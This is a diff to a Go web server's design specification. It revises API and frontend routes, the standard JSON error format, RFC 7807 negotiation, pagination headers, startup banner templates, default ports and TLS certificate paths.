-| `/graphql` | GET | None | GraphiQL interface |
-| `/graphql` | POST | None | GraphQL queries |
+| `/healthz` | GET | None | Health check — **frontend route** (HTML default; JSON via `Accept: application/json`; text via `Accept: text/plain` / CLI / `.txt` per FE content-negotiation rules) |
+| `/server/docs/swagger` | GET | None | Swagger UI (HTML) |
+| `/server/docs/graphql` | GET | None | GraphiQL interface (HTML) |
 | `/metrics` | GET | Optional | Prometheus metrics |
-| `/admin` | GET | Session | Admin panel login |
-| `/admin/*` | ALL | Session | Admin panel pages |
+| `/{admin_path}` | GET | Session | Admin panel login |
+| `/{admin_path}/*` | ALL | Session | Admin panel pages |
 | `/api/autodiscover` | GET | None | Server settings, config schema, and options for CLI/agent (non-versioned) |
-| `/api/v1/healthz` | GET | None | Health check (JSON) |
-| `/api/v1/admin/*` | ALL | Bearer | Admin API |
+| `/api/openapi.json` | GET | None | OpenAPI spec for current `{api_version}` (JSON only, served directly — see "Unversioned API aliases" below) |
+| `/api/graphql` | POST | None | GraphQL queries against current `{api_version}` (served directly — see "Unversioned API aliases" below) |
+| `/api/{api_version}/healthz` | GET | None | Health check (JSON) |
+| `/api/{api_version}/openapi.json` | GET | None | OpenAPI spec for that specific version (JSON only) |
+| `/api/{api_version}/graphql` | POST | None | GraphQL queries for that specific version |
+| `/api/{api_version}/{admin_path}/*` | ALL | Bearer | Admin API |
 
-**NOTE: No `/openapi.yaml` endpoint. JSON only.**
+**NOTE: No `/api/openapi.yaml` or `/api/{api_version}/openapi.yaml` endpoint. JSON only.**
+
+**NOTE: All dedicated API JSON endpoints live under `/api/...`. There is no root-level `/openapi.json` or `/graphql` POST. The Swagger UI and GraphiQL HTML pages live under `/server/docs/` (frontend), following the same pattern as `/server/about`, `/server/help`, etc.**
+
+**NOTE: `/healthz`, `/metrics`, `/sitemap.xml`, `/robots.txt`, `/favicon.ico`, `/.well-known/*`, `/manifest.json` are conventional root-level routes. `/healthz` is a frontend route that supports content negotiation — it returns HTML by default and JSON only when explicitly requested via `Accept: application/json`. This is consistent with the frontend/API split: `/healthz` is the frontend health page, `/api/{api_version}/healthz` is the dedicated JSON API endpoint.**
+
+### Unversioned API aliases — when, why, where
+
+**When to add an unversioned `/api/<thing>` alias for a versioned `/api/{api_version}/<thing>` endpoint:**
+
+| Add an alias when… | Skip the alias when… |
+|--------------------|----------------------|
+| The endpoint is *operationally* useful to clients that haven't picked a version yet (spec discovery, GraphQL entry, debug tooling) | The endpoint is *data*-shaped and could change between versions (resources, business logic) |
+| The contract is stable across versions OR the alias is documented as "current version's contract" | The contract is version-specific and clients should pin a version |
+| The cost of forcing clients to read `/api/autodiscover` first is real | Versioning is the whole point (e.g., `/api/{api_version}/users`) |
+
+**Examples that get an alias:** `/api/openapi.json`, `/api/graphql`, `/api/debug/*` (current set).
+**Examples that do NOT get an alias:** `/api/{api_version}/users`, `/api/{api_version}/orgs`, `/api/{api_version}/healthz` (these stay versioned only).
+
+**Why "served directly — no redirect" (not a 301/302 to the versioned URL):**
+
+| Reason | Detail |
+|--------|--------|
+| **Compatibility** | Many CLI tools, language SDKs, and minimal HTTP clients do not follow redirects by default. A direct response works for everyone. |
+| **Latency** | Saves an extra round-trip on every cold call — matters most for `/api/openapi.json` (fetched on every SDK regen) and `/api/graphql` (every introspection). |
+| **Caching** | Caches and CDNs cache the alias body directly. A 301 forces clients to cache *both* the redirect and the target, doubling cache entries. |
+| **POST safety** | `/api/graphql` is POST. A 301/302 from POST may convert to GET on some clients (RFC ambiguity). Direct serving avoids this. |
+| **Consistency** | The unversioned alias and versioned URL share one handler tree mounted at both paths — no duplicate code. |
+
+**What "no redirect" does NOT mean:**
+
+| Behavior | Still applies? | Why |
+|----------|----------------|-----|
+| Trailing-slash 301 normalization (`/api/openapi.json/` → `/api/openapi.json`) | **Yes** | URL canonicalization, not version routing — see "Normalization Rules" in PART 16 |
+| HTTP → HTTPS 301 | **Yes** | Transport-level, unrelated to API versioning |
+| Auth redirect for protected endpoints (e.g., admin debug API → login) | **Yes** | Security, unrelated |
+
+**Where to apply:** every unversioned `/api/<thing>` alias for a versioned endpoint. Mount the same handler at both the versioned path and the alias — do NOT implement the alias as a redirect to the versioned path.
 
 ## Response Standards
 
@@ -19233,20 +20588,35 @@ Need additional compatible endpoints?"
 
 #### Error Response
 
+**Canonical error shape — same shape everywhere (PART 9, PART 11, PART 14, PART 16). The HTTP status code carries the status; do not duplicate it in the body.**
+
 ```json
 {
   "ok": false,
   "error": "ERROR_CODE",
-  "message": "Human readable message"
+  "message": "Human readable message",
+  "details": {
+    "field": "email",
+    "rule": "format"
+  }
 }
 ```
 
 | Field | Required | Description |
 |-------|----------|-------------|
-| `error` | Yes | Human-readable error message |
-| `code` | Yes | Machine-readable error code (e.g., `INVALID_INPUT`, `NOT_FOUND`) |
-| `status` | Yes | HTTP status code |
-| `details` | No | Additional error context (validation errors, field names) |
+| `ok` | Yes | Always `false` for errors. Mirrors the `ok: true` of success responses. |
+| `error` | Yes | Machine-readable error code (UPPER_SNAKE_CASE). See the standard codes table in PART 9 (`BAD_REQUEST`, `VALIDATION_FAILED`, `UNAUTHORIZED`, `NOT_FOUND`, etc.). |
+| `message` | Yes | Human-readable explanation, safe to display to end users. NEVER includes stack traces, internal IPs, DB structure, or "username vs password" disclosure (see PART 5). |
+| `details` | No | Optional structured context for validation errors and similar — `{ "field": "...", "rule": "...", "input": "..." }` (input redacted for sensitive fields). Omit entirely when not needed. |
+
+**Forbidden in error responses (legacy formats — DO NOT use):**
+
+| Pattern | Reason |
+|---------|--------|
+| Putting the human text in `error` and the code in `code` | Wrong field semantics — `error` is the code field, `message` is the text field |
+| Including `status` in the body | The HTTP status code already carries this; duplicating diverges on retry |
+| Bare `{"error": "..."}` with no `ok`, no code | Cannot be distinguished from success programmatically; no error taxonomy |
+| Adding ad-hoc top-level fields (`reason`, `retry_after`, `self_healing`, etc.) | Use `details` instead, or appropriate HTTP headers like `Retry-After` |
 
 #### Pagination (default: 250 items)
 
@@ -19262,6 +20632,39 @@ Need additional compatible endpoints?"
 }
 ```
 
+**Plus a `Link:` header (RFC 8288 — Web Linking)** so clients can navigate without parsing the body. The server emits `first`, `prev`, `next`, `last` relations as appropriate (omit `prev` on first page, `next` on last):
+
+```
+Link: <https://api.example.com/api/v1/users?page=1&limit=250>; rel="first",
+      <https://api.example.com/api/v1/users?page=1&limit=250>; rel="prev",
+      <https://api.example.com/api/v1/users?page=3&limit=250>; rel="next",
+      <https://api.example.com/api/v1/users?page=4&limit=250>; rel="last"
+```
+
+URLs in the Link header are built via `BuildURL(r, ...)` so they pick up reverse-proxy headers (PART 12). Both the body `pagination` block and the `Link:` header are always emitted — clients can use whichever they prefer.
+
+#### RFC 7807 Opt-in (`application/problem+json`)
+
+The canonical error body above is custom — it pairs naturally with the success-response shape and is what every endpoint emits by default. For ecosystems that expect **RFC 7807 — Problem Details for HTTP APIs** (Spring, .NET, ASP.NET Core, Azure, etc.), the server transparently transforms the canonical body when the client signals it via Accept negotiation:
+
+| Request `Accept` header | Response `Content-Type` | Body |
+|-------------------------|--------------------------|------|
+| (none) or `application/json` | `application/json` | Canonical: `{ok, error, message, details?, _debug?}` |
+| `application/problem+json` | `application/problem+json` | RFC 7807: `{type, title, status, detail, instance, ...details}` |
+
+**RFC 7807 mapping** (when negotiated):
+
+| RFC 7807 field | Source |
+|----------------|--------|
+| `type` | URI built from `error` code: `https://{fqdn}/server/docs/errors/{ERROR_CODE}` (placeholder doc page; can be edited in admin panel) |
+| `title` | `message` field (short, human-readable) |
+| `status` | HTTP status code (mirrored in body for 7807 conformance) |
+| `detail` | Long-form explanation; in our spec, that lives in `details.message` if present, else mirrors `title` |
+| `instance` | Request URL path (from `r.URL.Path`) — gives the client a back-pointer to the failing endpoint |
+| Extension fields | Whatever was in `details` is flattened into the top-level object per RFC 7807 §3.2 |
+
+This is one middleware switch — endpoint code never writes RFC 7807 directly. Same goes for `application/health+json` on `/healthz` (see PART 13). The middleware preserves the `Vary: Accept` header so caches keyed on Accept don't return the wrong shape.
+
 ---
 
 # CHECKPOINT 6: FRONTEND & API VERIFICATION
@@ -19272,7 +20675,7 @@ Before proceeding, confirm you understand:
 - [ ] Project-wide theme system: light/dark/auto (dark is default)
 - [ ] Themes apply to entire project: WebUI, admin, Swagger, GraphQL
 - [ ] All 3 API types required: REST, Swagger, GraphQL (Swagger & GraphQL in sync)
-- [ ] Standard endpoints must exist (/healthz, /openapi, /openapi.json, /graphql, /admin)
+- [ ] Standard endpoints must exist (/healthz, /server/docs/swagger, /server/docs/graphql, /api/openapi.json, /api/graphql, /api/{api_version}/openapi.json, /api/{api_version}/graphql, /admin)
 - [ ] OpenAPI uses JSON only (no YAML)
 
 ---
@@ -19295,7 +20698,7 @@ Before proceeding, confirm you understand:
 
 **ALL DNS providers are supported.** The admin WebUI provides a dropdown that dynamically shows the appropriate credential fields based on the selected provider.
 
-**Admin WebUI Flow (`/admin/server/ssl`):**
+**Admin WebUI Flow (`/{admin_path}/server/ssl`):**
 
 1. Select DNS provider from dropdown (all lego-supported providers available)
 2. Form dynamically shows required credential fields for that provider
@@ -19328,9 +20731,9 @@ Before proceeding, confirm you understand:
 
 ### FQDN Resolution 
 
-**See PART 8: SERVER BINARY CLI → "URL Variables" section for complete `{proto}`, `wthr.top`, `{port}` resolution.**
+**See PART 8: SERVER BINARY CLI → "URL Variables" section for complete `{proto}`, `{fqdn}`, `{port}` resolution.**
 
-**Summary - `wthr.top` resolution order:**
+**Summary - `{fqdn}` resolution order:**
 
 | Priority | Source |
 |----------|--------|
@@ -19639,8 +21042,8 @@ func isDevTLD(host, projectName string) bool {
 | **NO_COLOR / TERM=dumb** | Plain text only, no emojis | `AppName v1.0.0` |
 | **≥80 cols** | Full ASCII art + icons + URLs | Full branded banner |
 | **60-79 cols** | Icons + text only, no ASCII art | `🚀 AppName v1.0.0` |
-| **40-59 cols** | Minimal text, abbreviated | `AppName 1.0.0 :8080` |
-| **<40 cols** | Single line only | `AppName :8080` |
+| **40-59 cols** | Minimal text, abbreviated | `AppName 1.0.0 https://mydomain.org` (external URL) — fall back to `:64580` ONLY if no reverse-proxy / DOMAIN observation yet |
+| **<40 cols** | Single line only | `AppName https://mydomain.org` (external URL) — fall back to `:64580` ONLY if no observation yet |
 
 ```go
 // src/server/banner/banner.go
@@ -19872,8 +21275,8 @@ func formatURL(host string, port int, isHTTPS bool) string {
 **Usage:**
 ```go
 // Single HTTP port
-// Returns: http://host:8080
-formatURL(host, 8080, false)
+// Returns: http://host:64580
+formatURL(host, 64580, false)
 
 // Single HTTPS port (443 = HTTPS-only mode)
 // Returns: https://host (443 forces HTTPS)
@@ -19884,10 +21287,10 @@ formatURL(host, 443, false)
 formatURL(host, 80, false)
 // Returns: https://host
 formatURL(host, 443, true)
-// Returns: http://host:8080
-formatURL(host, 8080, false)
-// Returns: https://host:8443
-formatURL(host, 8443, true)
+// Returns: http://host:64580
+formatURL(host, 64580, false)
+// Returns: https://host:64643
+formatURL(host, 64643, true)
 ```
 
 **Overlay Network Protocol Rules (Tor, I2P, etc.):**
@@ -19920,19 +21323,19 @@ formatURL(host, 8443, true)
 
 **Footer timestamp format:** `%B %-d, %Y at %H:%M:%S` → `December 4, 2025 at 13:05:13`
 
-**"Last update" MUST use build date, NEVER hardcoded.** Use `{builddatetime}` template variable which comes from `BUILD_DATE` at compile time. This ensures the footer always shows when the binary was built, not a static date in the source code.
+**"Last update" MUST use build date, NEVER hardcoded.** Use `{build_datetime}` template variable which comes from `BUILD_DATE` at compile time. This ensures the footer always shows when the binary was built, not a static date in the source code.
 
 **⚠️ DYNAMIC WIDTH: Banner width adapts to terminal size at runtime. Examples below show ≥80 col format. See "Responsive Startup Banner" section for all size variants (<40, 40-59, 60-79, ≥80 cols).**
 
 **Example (Production with SSL + Tor on 443):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔒 Running in mode: production                           │
 ├───────────────────────────────────────────────────────────┤
 │  🧅 Tor:   http://{onion_address}                         │
-│  🔐 HTTPS: {proto}://wthr.top                               │
+│  🔐 HTTPS: {proto}://{fqdn}                               │
 ├───────────────────────────────────────────────────────────┤
 │  📡 Listening on {proto}://{address}                      │
 │  ✅ Server started on {startup_datetime}                  │
@@ -19942,7 +21345,7 @@ formatURL(host, 8443, true)
 **Example (Full Banner with Tor + I2P + SMTP):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔒 Running in mode: {app_mode}                           │
 ├───────────────────────────────────────────────────────────┤
@@ -19952,7 +21355,7 @@ formatURL(host, 8443, true)
 ├───────────────────────────────────────────────────────────┤
 │  📡 Listening on {proto}://{address}                      │
 ├───────────────────────────────────────────────────────────┤
-│  🔐 Website: {proto}://wthr.top                             │
+│  🔐 Website: {proto}://{fqdn}                             │
 ├───────────────────────────────────────────────────────────┤
 │  ✅ Server started on {startup_datetime}                  │
 ╰───────────────────────────────────────────────────────────╯
@@ -19961,11 +21364,11 @@ formatURL(host, 8443, true)
 **Example (Production on port 8080):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔒 Running in mode: production                           │
 ├───────────────────────────────────────────────────────────┤
-│  🌐 HTTP:  {proto}://wthr.top:{port}                        │
+│  🌐 HTTP:  {proto}://{fqdn}:{port}                        │
 ├───────────────────────────────────────────────────────────┤
 │  📡 Listening on {proto}://{address}:{port}               │
 │  ✅ Server started on {startup_datetime}                  │
@@ -19975,7 +21378,7 @@ formatURL(host, 8443, true)
 **Example (Development on port 8080):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔧 Running in mode: development                          │
 ├───────────────────────────────────────────────────────────┤
@@ -19989,7 +21392,7 @@ formatURL(host, 8443, true)
 **Example (Development IPv6 on port 8080):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔧 Running in mode: development                          │
 ├───────────────────────────────────────────────────────────┤
@@ -20003,11 +21406,11 @@ formatURL(host, 8443, true)
 **Example (Production on port 80):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔒 Running in mode: production                           │
 ├───────────────────────────────────────────────────────────┤
-│  🌐 HTTP:  {proto}://wthr.top                               │
+│  🌐 HTTP:  {proto}://{fqdn}                               │
 ├───────────────────────────────────────────────────────────┤
 │  📡 Listening on {proto}://{address}                      │
 │  ✅ Server started on {startup_datetime}                  │
@@ -20017,11 +21420,11 @@ formatURL(host, 8443, true)
 **Example (Production with debugging enabled):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔒 Running in mode: {app_mode} [debugging]               │
 ├───────────────────────────────────────────────────────────┤
-│  🌐 HTTP:  {proto}://wthr.top                               │
+│  🌐 HTTP:  {proto}://{fqdn}                               │
 ├───────────────────────────────────────────────────────────┤
 │  📡 Listening on {proto}://{address}                      │
 │  ✅ Server started on {startup_datetime}                  │
@@ -20031,7 +21434,7 @@ formatURL(host, 8443, true)
 **Example (First Run - Setup Required):**
 ```
 ╭───────────────────────────────────────────────────────────╮
-│  🚀 WEATHER · 📦 1.0.0                   │
+│  🚀 WEATHER · 📦 {project_version}                   │
 ├───────────────────────────────────────────────────────────┤
 │  🔧 Running in mode: {app_mode}                           │
 ├───────────────────────────────────────────────────────────┤
@@ -20046,7 +21449,7 @@ formatURL(host, 8443, true)
 ├───────────────────────────────────────────────────────────┤
 │  Setup Token: {setup_token}                               │
 │                                                           │
-│  Go to {proto}://wthr.top/admin/server/setup         │
+│  Go to {proto}://{fqdn}/{admin_path}/server/setup         │
 │  and enter this token to complete setup.                  │
 │                                                           │
 │  This token will only be shown ONCE.                      │
@@ -20063,16 +21466,16 @@ formatURL(host, 8443, true)
 
 **60-79 cols (Compact - no ASCII art, icons + text):**
 ```
-🚀 WEATHER v1.0.0
+🚀 WEATHER v{project_version}
 🔒 Mode: {app_mode}
-🌐 {proto}://wthr.top
+🌐 {proto}://{fqdn}
 📡 Listening: {proto}://{address}:{port}
 ✅ Started: {startup_datetime}
 ```
 
 **60-79 cols (Compact - First Run):**
 ```
-🚀 WEATHER v1.0.0
+🚀 WEATHER v{project_version}
 🔧 Mode: {app_mode}
 🌐 {proto}://{address}:{port}
 📡 Listening: {proto}://{address}:{port}
@@ -20080,20 +21483,20 @@ formatURL(host, 8443, true)
 
 🔑 SETUP REQUIRED
 Token: {setup_token}
-Go to: {proto}://wthr.top/admin/server/setup
+Go to: {proto}://{fqdn}/{admin_path}/server/setup
 (Token shown ONCE)
 ```
 
 **40-59 cols (Minimal - abbreviated, no icons):**
 ```
-WEATHER 1.0.0
+WEATHER {project_version}
 {app_mode}
-wthr.top:{port}
+{fqdn}:{port}
 ```
 
 **40-59 cols (Minimal - First Run):**
 ```
-WEATHER 1.0.0
+WEATHER {project_version}
 {app_mode}
 {address}:{port}
 SETUP: {setup_token}
@@ -20111,16 +21514,16 @@ WEATHER :{port} [SETUP]
 
 **NO_COLOR / TERM=dumb (Plain text - no emojis, no box drawing, no colors):**
 ```
-WEATHER v1.0.0
+WEATHER v{project_version}
 Mode: {app_mode}
-URL: {proto}://wthr.top
+URL: {proto}://{fqdn}
 Listening: {proto}://{address}:{port}
 Started: {startup_datetime}
 ```
 
 **NO_COLOR / TERM=dumb (Plain - First Run):**
 ```
-WEATHER v1.0.0
+WEATHER v{project_version}
 Mode: {app_mode}
 URL: {proto}://{address}:{port}
 Listening: {proto}://{address}:{port}
@@ -20128,7 +21531,7 @@ Started: {startup_datetime}
 
 SETUP REQUIRED
 Token: {setup_token}
-Setup URL: {proto}://wthr.top/admin/server/setup
+Setup URL: {proto}://{fqdn}/{admin_path}/server/setup
 This token will only be shown ONCE.
 ```
 
@@ -20157,7 +21560,8 @@ weather --color=auto
 
 **Log format is ALWAYS plain text:**
 ```
-2025-01-15 09:00:00 INFO  Server started on :8080
+2025-01-15 09:00:00 INFO  bind: 0.0.0.0:64580 ok
+2025-01-15 09:00:00 INFO  externally accessible at: https://mydomain.org
 2025-01-15 09:00:01 INFO  Database connected
 2025-01-15 09:00:05 WARN  High memory usage: 85%
 2025-01-15 09:00:10 ERROR Connection timeout to upstream
@@ -20176,9 +21580,9 @@ weather --color=auto
 | Priority | Path | Description |
 |----------|------|-------------|
 | 1 | `/etc/letsencrypt/live/domain/` | Literal "domain" directory (common shared setup) |
-| 2 | `/etc/letsencrypt/live/wthr.top/` | FQDN-named directory (e.g., `/etc/letsencrypt/live/api.example.com/`) |
-| 3 | `{config_dir}/ssl/letsencrypt/wthr.top/` | App-managed Let's Encrypt certificates |
-| 4 | `{config_dir}/ssl/local/wthr.top/` | Self-signed or user-provided certificates |
+| 2 | `/etc/letsencrypt/live/{fqdn}/` | FQDN-named directory (e.g., `/etc/letsencrypt/live/api.example.com/`) |
+| 3 | `{config_dir}/ssl/letsencrypt/{fqdn}/` | App-managed Let's Encrypt certificates |
+| 4 | `{config_dir}/ssl/local/{fqdn}/` | Self-signed or user-provided certificates |
 
 **Certificate Validation:**
 - Certificate CN or SAN must match configured FQDN (`server.host`)
@@ -20190,24 +21594,24 @@ weather --color=auto
 ```
 {config_dir}/ssl/
 ├── letsencrypt/
-│   └── wthr.top/                # e.g., api.example.com/
+│   └── {fqdn}/                # e.g., api.example.com/
 │       ├── fullchain.pem
 │       └── privkey.pem
 └── local/
-    └── wthr.top/                # e.g., api.example.com/
+    └── {fqdn}/                # e.g., api.example.com/
         ├── cert.pem
         └── key.pem
 ```
 
-**Mirrors certbot structure** (`/etc/letsencrypt/live/wthr.top/`) for consistency.
+**Mirrors certbot structure** (`/etc/letsencrypt/live/{fqdn}/`) for consistency.
 
 ### Certificate Management Ownership
 
 | Location | Manager | Renewal |
 |----------|---------|---------|
 | `/etc/letsencrypt/live/**` | **System** (certbot) | App does NOT renew |
-| `{config_dir}/ssl/letsencrypt/wthr.top/` | **App** | Auto-renew 7 days before expiry |
-| `{config_dir}/ssl/local/wthr.top/` | **User** | No auto-renewal (manual) |
+| `{config_dir}/ssl/letsencrypt/{fqdn}/` | **App** | Auto-renew 7 days before expiry |
+| `{config_dir}/ssl/local/{fqdn}/` | **User** | No auto-renewal (manual) |
 
 **Rule: If cert is in `{config_dir}/ssl/**`, app manages. Subdirectory determines HOW.**
 
@@ -20215,8 +21619,8 @@ weather --color=auto
 
 | Directory | Check Frequency | Renewal Trigger |
 |-----------|-----------------|-----------------|
-| `{config_dir}/ssl/letsencrypt/wthr.top/` | Daily (03:00) | 7 days before expiry |
-| `{config_dir}/ssl/local/wthr.top/` | Never | Manual only |
+| `{config_dir}/ssl/letsencrypt/{fqdn}/` | Daily (03:00) | 7 days before expiry |
+| `{config_dir}/ssl/local/{fqdn}/` | Never | Manual only |
 | `/etc/letsencrypt/live/**` | Never | System (certbot) manages |
 
 **Logic Flow:**
@@ -20226,24 +21630,24 @@ Startup (for configured FQDN)
    ├─► Check /etc/letsencrypt/live/domain/
    │   └─► Found + cert matches FQDN? → Use it (system manages)
    │
-   ├─► Check /etc/letsencrypt/live/wthr.top/
+   ├─► Check /etc/letsencrypt/live/{fqdn}/
    │   └─► Found? → Use it (system manages)
    │
-   ├─► Check {config_dir}/ssl/letsencrypt/wthr.top/
+   ├─► Check {config_dir}/ssl/letsencrypt/{fqdn}/
    │   └─► Found? → Use it (app auto-renews)
    │
-   ├─► Check {config_dir}/ssl/local/wthr.top/
+   ├─► Check {config_dir}/ssl/local/{fqdn}/
    │   └─► Found? → Use it (no auto-renewal)
    │
    └─► Not found anywhere
        └─► Request new cert via Let's Encrypt
-           └─► Save to {config_dir}/ssl/letsencrypt/wthr.top/ (app auto-renews)
+           └─► Save to {config_dir}/ssl/letsencrypt/{fqdn}/ (app auto-renews)
 ```
 
 **Important:**
 - `/etc/letsencrypt/` → app uses but does NOT manage renewal
-- `{config_dir}/ssl/letsencrypt/wthr.top/` → app manages, auto-renews 7 days before expiry
-- `{config_dir}/ssl/local/wthr.top/` → app uses but does NOT auto-renew (user manages)
+- `{config_dir}/ssl/letsencrypt/{fqdn}/` → app manages, auto-renews 7 days before expiry
+- `{config_dir}/ssl/local/{fqdn}/` → app uses but does NOT auto-renew (user manages)
 
 ---
 
@@ -20263,7 +21667,7 @@ Startup (for configured FQDN)
 | **Accessibility** | WCAG 2.1 AA compliant, screen reader friendly |
 | **UX** | Readable, navigable, intuitive, user-friendly, self-explanatory |
 | **PWA Support** | Progressive Web App - installable, offline-capable |
-| **CORS** | `Access-Control-Allow-Origin: *` for API endpoints |
+| **CORS** | Credentials-aware "just works" — `*` for public APIs, echoed Origin for auth flows. See PART 16 → "CORS" for full resolution order and per-response logic. |
 
 ## Frontend Consumes Backend 
 
@@ -20282,14 +21686,14 @@ Startup (for configured FQDN)
 
 | API Route | Frontend Route | Page Type |
 |-----------|----------------|-----------|
-| `GET /api/v1/users` | `GET /users` | Current user profile |
-| `PATCH /api/v1/users` | `POST /users` | Profile update form |
-| `GET /api/v1/users/tokens` | `GET /users/tokens` | Token list page |
-| `GET /api/v1/users/settings` | `GET /users/settings` | User settings page |
-| `GET /api/v1/users/security` | `GET /users/security` | Security settings page |
-| `GET /api/v1/orgs` | `GET /orgs` | User's org list |
-| `GET /api/v1/orgs/{slug}` | `GET /orgs/{slug}` | Org detail page |
-| `GET /api/v1/server/about` | `GET /server/about` | About page |
+| `GET /api/{api_version}/users` | `GET /users` | Current user profile |
+| `PATCH /api/{api_version}/users` | `POST /users` | Profile update form |
+| `GET /api/{api_version}/users/tokens` | `GET /users/tokens` | Token list page |
+| `GET /api/{api_version}/users/settings` | `GET /users/settings` | User settings page |
+| `GET /api/{api_version}/users/security` | `GET /users/security` | Security settings page |
+| `GET /api/{api_version}/orgs` | `GET /orgs` | User's org list |
+| `GET /api/{api_version}/orgs/{slug}` | `GET /orgs/{slug}` | Org detail page |
+| `GET /api/{api_version}/server/about` | `GET /server/about` | About page |
 
 ### Vanity URLs (OPTIONAL - Requires PART 34/35)
 
@@ -20299,23 +21703,23 @@ This is OPTIONAL and only applies to apps where user/org profiles are a core fea
 
 | Vanity URL | Maps To | API Equivalent | Example Apps |
 |------------|---------|----------------|--------------|
-| `/{username}` | `/users/{username}` | `/api/v1/users/{username}` | GitHub, Linktree, Twitter |
-| `/{orgname}` | `/orgs/{orgname}` | `/api/v1/orgs/{orgname}` | GitHub, GitLab, Gitea |
-| `/{username}/{project}` | `/users/{username}/{project}` | `/api/v1/users/{username}/projects/{project}` | GitHub repos |
-| `/{orgname}/{project}` | `/orgs/{orgname}/{project}` | `/api/v1/orgs/{orgname}/projects/{project}` | GitHub org repos |
+| `/{user_name}` | `/users/{user_name}` | `/api/{api_version}/users/{user_name}` | GitHub, Linktree, Twitter |
+| `/{org_name}` | `/orgs/{org_name}` | `/api/{api_version}/orgs/{org_name}` | GitHub, GitLab, Gitea |
+| `/{user_name}/{project}` | `/users/{user_name}/{project}` | `/api/{api_version}/users/{user_name}/projects/{project}` | GitHub repos |
+| `/{org_name}/{project}` | `/orgs/{org_name}/{project}` | `/api/{api_version}/orgs/{org_name}/projects/{project}` | GitHub org repos |
 
 **Route Priority (NON-NEGOTIABLE when implemented):**
 
 ```
-1. /api/v1/*          → API routes (highest priority)
-2. /admin/*     → Admin panel (configurable path)
+1. /api/{api_version}/*          → API routes (highest priority)
+2. /{admin_path}/*     → Admin panel (configurable path)
 3. /healthz           → Health check
 4. /static/*          → Static assets
 5. /users/*           → Explicit user routes
 6. /orgs/*            → Explicit org routes
 7. /{reserved}        → Reserved names (see below)
-8. /{username}        → User vanity URL (lowest priority)
-9. /{orgname}         → Org vanity URL (if no user match)
+8. /{user_name}        → User vanity URL (lowest priority)
+9. /{org_name}         → Org vanity URL (if no user match)
 ```
 
 **Reserved Names (MUST block from registration):**
@@ -20361,12 +21765,12 @@ func vanityHandler(w http.ResponseWriter, r *http.Request) {
 
     switch routeType {
     case "user":
-        // /{username} → proxy to /api/v1/users/{username}
-        // /{username}/{repo} → proxy to /api/v1/users/{username}/repos/{repo}
+        // /{user_name} → proxy to /api/{api_version}/users/{user_name}
+        // /{user_name}/{repo} → proxy to /api/{api_version}/users/{user_name}/repos/{repo}
         proxyToUserAPI(w, r, id, sub, item)
     case "org":
-        // /{orgname} → proxy to /api/v1/orgs/{orgname}
-        // /{orgname}/{repo} → proxy to /api/v1/orgs/{orgname}/repos/{repo}
+        // /{org_name} → proxy to /api/{api_version}/orgs/{org_name}
+        // /{org_name}/{repo} → proxy to /api/{api_version}/orgs/{org_name}/repos/{repo}
         proxyToOrgAPI(w, r, id, sub, item)
     case "reserved":
         http.Redirect(w, r, "/"+slug, http.StatusFound) // let normal router handle
@@ -20471,13 +21875,13 @@ func URLNormalizeMiddleware(next http.Handler) http.Handler {
 }
 ```
 
-**Normalization Rules:**
+### Normalization Rules
 
 | Input | Output | Action |
 |-------|--------|--------|
 | `/users/` | `/users` | 301 redirect |
 | `/server/about/` | `/server/about` | 301 redirect |
-| `/api/v1/users/` | `/api/v1/users` | 301 redirect |
+| `/api/{api_version}/users/` | `/api/{api_version}/users` | 301 redirect |
 | `/users` | `/users` | No redirect (canonical) |
 | `/` | `/` | No redirect (root exception) |
 | `/static/css/style.css` | `/static/css/style.css` | No redirect (file) |
@@ -20603,16 +22007,16 @@ func detectClientType(r *http.Request) string {
 
 2. **API Endpoints** (programmatic):
    ```bash
-   curl -q -LSsf -X POST /api/v1/auth/register -d '{"username":"test","email":"test@example.com"}'
-   curl -q -LSsf -X PATCH /api/v1/users -d '{"email":"new@test.com"}'  # Current user
-   curl -q -LSsf -X PATCH /api/v1/admin/users/123 -d '{"email":"new@test.com"}'  # Admin
-   curl -q -LSsf -X DELETE /api/v1/admin/users/123  # Admin
+   curl -q -LSsf -X POST /api/{api_version}/auth/register -d '{"username":"test","email":"test@example.com"}'
+   curl -q -LSsf -X PATCH /api/{api_version}/users -d '{"email":"new@test.com"}'  # Current user
+   curl -q -LSsf -X PATCH /api/{api_version}/{admin_path}/users/123 -d '{"email":"new@test.com"}'  # Admin
+   curl -q -LSsf -X DELETE /api/{api_version}/{admin_path}/users/123  # Admin
    ```
 
 3. **Frontend Direct** (CLI/scripting):
    ```bash
    curl -q -LSsf -X POST /auth/register -d 'username=test&email=test@example.com'  # Form-encoded
-   curl -q -LSsf /{username}  # Returns text (auto-detected) - public profile
+   curl -q -LSsf /{user_name}  # Returns text (auto-detected) - public profile
    ```
 
 **Rule:** CRUD must work for browsers (HTML forms), APIs (JSON), and CLI (text/form-encoded).
@@ -20820,7 +22224,7 @@ footer {
 | `<pre><code>` | Multi-line code blocks | Configuration, scripts |
 | `<kbd>` | Keyboard input | `Ctrl+C`, `Enter` |
 | `<samp>` | Sample output | Command output, logs |
-| `<var>` | Variables, placeholders | `{username}`, `$PATH` |
+| `<var>` | Variables, placeholders | `{user_name}`, `$PATH` |
